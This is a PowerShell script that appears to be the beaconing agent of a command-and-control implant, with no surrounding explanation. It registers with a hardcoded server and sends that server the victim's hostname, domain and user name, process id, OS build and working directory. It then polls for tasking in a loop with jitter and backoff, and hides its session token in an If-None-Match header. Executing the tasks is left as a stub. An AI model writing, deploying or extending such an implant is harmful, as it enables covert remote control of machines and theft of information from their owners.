param(
  [string]$WHost = '10.10.150.11',
  [int]$WPort = 80,
  [string]$Key = '448b5e4bf0d8d311e4e94b79868885206ebaefce7294bbbb119a2467a9d9b6e3',
  [int]$MinBackoffSec = 5,
  [int]$MaxBackoffSec = 120
)

$ErrorActionPreference = 'Stop'
$baseUri = "http://$($WHost):$($WPort)"
$registerUri = "$baseUri/api/data"
$pollUri     = "$baseUri/api/health"

function Get-AgentProfile {
  $os = (Get-CimInstance Win32_OperatingSystem)
  $json = [pscustomobject]@{
    agent_key         = $Key
    hostname          = $env:COMPUTERNAME
    ip_addr           = @('10.10.150.11')   # swap/augment as needed
    os                = $os.Caption
    build             = ( "$os.BuildNumber  $os.Version")
    pid               = $pid
    user              = "$env:USERDOMAIN/$env:USERNAME"
    cwd               = (Get-Location).Path
    callback_interval = 60
    jitter_value      = 15
    default_shell     = 'powershell'
    IntegrityLevel    = 'user'
  } | ConvertTo-Json -Depth 4
  return $json
}

function Register-Agent {
  $body = Get-AgentProfile
  $resp = Invoke-WebRequest -Uri $registerUri -Method POST -ContentType 'application/json' -Body $body
  $obj  = $resp.Content | ConvertFrom-Json
  [pscustomobject]@{
    StatusCode       = $resp.StatusCode
    SessionToken     = $obj.session_token
    CallbackInterval = [int]$obj.callback_interval
    Raw              = $obj
  }
}

function Poll-Once {
  param([string]$SessionToken)

  $headers = @{}
  if ($SessionToken) { $headers['If-None-Match'] = $SessionToken }

  try {
    $r = Invoke-WebRequest -Uri $pollUri -Method GET -Headers $headers
    $code = [int]$r.StatusCode
    if ($code -eq 200) {
      $data = $r.Content | ConvertFrom-Json
      return [pscustomobject]@{
        Code            = 200
        Data            = $data
        CallbackInterval= if ($data.callback_interval) { [int]$data.callback_interval } else { $null }
        NewSessionToken = if ($data.session_token) { $data.session_token } else { $null }
      }
    } else {
      return [pscustomobject]@{ Code = $code; Data = $null }
    }
  } catch [System.Net.WebException] {
    $resp = $_.Exception.Response
    if ($resp) {
      $code = [int]$resp.StatusCode
      if ($code -eq 304) {
        return [pscustomobject]@{ Code = 304; Data = $null }
      }
      return [pscustomobject]@{ Code = $code; Data = $null; Error = $_.Exception.Message }
    }
    return [pscustomobject]@{ Code = -1; Data = $null; Error = $_.Exception.Message }
  }
}

# --- main ---
Write-Verbose "Registering agent at $registerUri"
$reg = Register-Agent
if ($reg.StatusCode -ne 200 -and $reg.StatusCode -ne 201) {
  throw "Registration failed: HTTP $($reg.StatusCode)"
}

$sessionToken     = $reg.SessionToken
$callbackInterval = if ($reg.CallbackInterval) { $reg.CallbackInterval } else { 60 }
if (-not $sessionToken) { throw "No session_token received at registration." }

Write-Host "Registered. SessionToken=$sessionToken, interval=${callbackInterval}s"

$backoff = $MinBackoffSec
while ($true) {
  $tickStart = Get-Date
  $poll = Poll-Once -SessionToken $sessionToken

  switch ($poll.Code) {
    200 {
      if ($poll.NewSessionToken) { $sessionToken = $poll.NewSessionToken }
      if ($poll.CallbackInterval) { $callbackInterval = $poll.CallbackInterval }

      # Do something with $poll.Data if your server actually sends work.
      # For now, just log the fact we got fresh content.
      Write-Host ("[{0:u}] Work payload received: {1}" -f (Get-Date), ($poll.Data | ConvertTo-Json -Depth 6))
      $backoff = $MinBackoffSec
    }
    304 {
      # No changes. Quiet by design.
      $backoff = $MinBackoffSec
    }
    default {
      # Transient hiccup or server gripe—backoff with jitter.
      $jitter = Get-Random -Minimum 0 -Maximum ([math]::Max(1,[int]($backoff/3)))
      $sleep  = [math]::Min($MaxBackoffSec, $backoff + $jitter)
      Write-Host ("[{0:u}] Poll error code {1}. Backing off {2}s." -f (Get-Date), $poll.Code, $sleep)
      Start-Sleep -Seconds $sleep
      $backoff = [math]::Min($MaxBackoffSec, [int]([math]::Ceiling($backoff * 1.8)))
      continue
    }
  }

  # Honor interval (minus the time we just spent)
  $elapsed = [int]((Get-Date) - $tickStart).TotalSeconds
  $sleepFor = [math]::Max(0, $callbackInterval - $elapsed)
  if ($sleepFor -gt 0) { Start-Sleep -Seconds $sleepFor }
}
